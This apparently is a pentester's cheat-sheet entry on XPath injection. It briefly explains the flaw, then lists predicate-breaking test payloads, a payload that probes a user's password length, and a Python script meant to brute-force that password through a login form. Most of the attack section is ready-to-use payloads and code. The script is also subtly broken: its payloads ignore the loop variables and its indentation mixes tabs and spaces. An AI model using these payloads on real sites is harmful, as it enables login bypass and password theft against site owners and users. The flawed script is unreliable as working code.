# XPATH Injection

Similar to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured, or access data that they may not normally have access to. They may even be able to elevate their privileges on the web site if the XML data is being used for authentication (such as an XML based user file).

<u>**Test:**</u>

```bash
" AND 1=0] | //*["1"="1
#single quotes
' AND 1=0] | //*['1'='1
#1=1
' AND 1=1] | //*['1'='1
#no 1=1
' ] | //*['1'='1
```

<u>**Getting password:**</u>

```bash
#after getting valid user name, rita in this case, get length of pass, and change the =3 in the password/text to the length
' or Username='rita' and string-length(Password/text())=3 or '2' = '1
```

```python
#bruteforce pass with python

import requests
import string

keyspace = string.printable[:-5]
user='rita'

def get_length(username):
    for i in range (0,33):
        payload = f"' or Username='rita' and string-length(Password/text())=3 or '2' = '1"
        data = {'Username':'', 'Password':payload}
        r = requests.post("http://loginform", data=data)
        if "credentials" not in r.text:
            return i
        
def brute_char(username, pos):
    for char in keyspace:
        payload = f"' or Username='rita' and string-length(Password/text())=3 or '2' = '1"
		data = {'Username':'', 'Password':payload}
        r = requests.post("http://loginform", data=data)
        if "credentials" not in r.text:
            return char
	return False
        
pw_len = get_length(user)
print(f"Password Length for {user} is {pw_len}")
print(f"Password for {user} is: ", end='', flush=True)

for i in range(1, pw_len+1):
    pw_char = brute_char(user, i)
    if not pw_char:
        print("Character not in keyspace")
    print(pw_char, end='', flush=True)
```



More techniques:

https://rhinosecuritylabs.com/penetration-testing/xpath-injection-attack-defense-techniques/



https://book.hacktricks.xyz/pentesting-web/xpath-injection